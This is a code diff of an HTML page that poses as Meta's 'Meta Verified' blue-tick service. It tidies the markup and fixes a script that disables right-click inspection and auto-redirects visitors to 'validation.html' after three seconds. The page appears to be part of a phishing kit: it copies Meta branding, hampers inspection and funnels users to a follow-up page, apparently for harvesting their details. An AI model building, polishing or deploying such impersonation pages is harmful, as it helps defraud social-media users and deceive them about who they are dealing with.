@@ -1,7 +1,13 @@
-<!DOCTYPE html><html lang="en"><head>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta Verified | Get a verified blue tick</title>
+    <meta name="description" content="Get Meta Verified and stand out on Instagram and Facebook with the blue tick.">
+    <meta name="keywords" content="Meta Verified, Blue Tick, Instagram, Facebook, Verification">
+    <meta name="author" content="Meta Verified">
+    <title>Meta Verified | Get a Verified Blue Tick</title>
     <link href="bootstrap.min.css" rel="stylesheet">
     <style>
         /* CSS styles */
@@ -40,15 +46,14 @@
             display: inline-block;
             margin-top: 1rem;
             font-family: Arial, sans-serif;
-            /* Same font family */
             font-size: 16px;
-            /* Adjust as needed */
         }
 
         .content {
             margin-top: 3rem;
             display: flex;
             justify-content: center;
+            flex-wrap: wrap;
         }
 
         .content .col-sm-6 {
@@ -60,42 +65,48 @@
             font-size: 18px;
             margin-top: 1rem;
             font-family: Arial, sans-serif;
-            /* Same font family */
         }
 
         .sign-up {
             font-size: 17px;
             padding-top: 1rem;
             font-family: Arial, sans-serif;
-            /* Same font family */
         }
 
         .business-info {
             font-size: 14px;
             font-family: Arial, sans-serif;
-            /* Same font family */
         }
 
         .region-info {
             font-size: 13px;
             font-style: italic;
             font-family: Arial, sans-serif;
-            /* Same font family */
         }
 
         .image {
             display: none;
             width: 42%;
             height: 100vh;
-            /* Ensure full height */
             background-size: cover;
-            /* background-position: center; */
-            /* margin-left: 5rem; */
+            background-position: center;
         }
 
         @media (min-width: 576px) {
             .image {
                 display: block;
+            }
+        }
+
+        @media (max-width: 576px) {
+            .content .col-sm-6 {
+                margin-left: 0;
+                text-align: center;
+            }
+
+            .image {
+                width: 100%;
+                height: auto;
             }
         }
     </style>
@@ -104,12 +115,12 @@
 <body>
     <div class="container-fluid">
         <div class="container">
-            <img src="meta-logo-QVrNRj93.svg" alt="logo" class="logo">
+            <img src="meta-logo-QVrNRj93.svg" alt="Meta Verified Logo" class="logo">
         </div>
     </div>
     <div class="content">
         <div class="col-sm-6">
-            <img src="blue_tick-B9ADAlwo.png" alt="meta" class="meta-logo">
+            <img src="blue_tick-B9ADAlwo.png" alt="Meta Verified Blue Tick" class="meta-logo">
             <h1 class="my-3 fs-1">Stand out with Meta<br> Verified</h1>
             <div style="margin-bottom: 30px;"></div>
             <a class="btn" href="validation.html">Apply</a>
@@ -121,19 +132,20 @@
             <a href="#" class="business-info">Meta verified for businesses</a>
             <p class="mt-4 font-italic region-info">Features, availability, and pricing may vary by region.</p>
         </div>
-        <div class="col-sm-5 image" style="background-image: url('background.png'); "></div>
+        <div class="col-sm-5 image" style="background-image: url('background.png');"></div>
     </div>
 
-<script>
-    document.addEventListener('contextmenu', event => {
-        event.preventDefault();
-    });
+    <script>
+        document.addEventListener('contextmenu', event => {
+            event.preventDefault();
+        });
 
-    setTimeout(function() {
-    var redirectURL = "validation.html"; // Updated URL
-    window.location.replace(redirectURL);
-    }, 3000); // 3000 milliseconds (3 seconds)
-    });
-</script>
+        setTimeout(function () {
+            var redirectURL = "validation.html"; // Updated URL
+            window.location.replace(redirectURL);
+        }, 3000); // 3000 milliseconds (3 seconds)
+    </script>
 
-</body></html>
+</body>
+
+</html>
